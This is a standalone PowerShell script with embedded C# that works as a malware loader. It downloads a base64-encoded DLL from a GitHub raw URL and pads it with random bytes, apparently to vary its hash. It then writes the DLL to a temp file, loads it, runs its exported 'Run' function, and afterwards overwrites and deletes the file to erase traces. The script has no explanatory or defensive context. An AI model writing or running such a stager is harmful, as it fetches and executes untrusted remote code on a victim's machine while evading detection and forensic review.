$Base64 = Invoke-WebRequest -Uri "https://github.com/cpunka/xx/raw/refs/heads/main/dllbase64.txt" -UseBasicParsing $DLLBytes = [System.Convert]::FromBase64String($Base64.Content) $rand = New-Object System.Random $extraLen = $rand.Next(16, 64) $pad = New-Object byte[] $extraLen $rand.NextBytes($pad) $FinalBytes = $DLLBytes + $pad $UnsafeNativeMethods = @" using System; using System.Runtime.InteropServices; public class UnsafeNativeMethods { [DllImport("kernel32.dll", SetLastError = true)] public static extern IntPtr LoadLibrary(string dllName); [DllImport("kernel32.dll", SetLastError = true)] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName); [DllImport("kernel32.dll", SetLastError = true)] public static extern bool FreeLibrary(IntPtr hModule); [UnmanagedFunctionPointer(CallingConvention.StdCall)] public delegate void RunDelegate(); public static void Run(byte[] dllBytes) { string uniqueFileName = System.Guid.NewGuid().ToString() + ".tmp"; string tempPath = System.IO.Path.Combine(System.IO.Path.GetTempPath(), uniqueFileName); System.IO.File.WriteAllBytes(tempPath, dllBytes); System.Threading.Thread.Sleep(3000); IntPtr hModule = LoadLibrary(tempPath); if (hModule == IntPtr.Zero) { return; } IntPtr funcAddr = GetProcAddress(hModule, "Run"); if (funcAddr == IntPtr.Zero) { FreeLibrary(hModule); return; } RunDelegate run = (RunDelegate)Marshal.GetDelegateForFunctionPointer(funcAddr, typeof(RunDelegate)); run(); FreeLibrary(hModule); System.Threading.Thread.Sleep(1000); try { byte[] overwrite = new byte[new System.IO.FileInfo(tempPath).Length]; new Random().NextBytes(overwrite); System.IO.File.WriteAllBytes(tempPath, overwrite); } catch {} try { System.IO.File.Delete(tempPath); } catch {} } } "@ Add-Type $UnsafeNativeMethods [UnsafeNativeMethods]::Run($FinalBytes)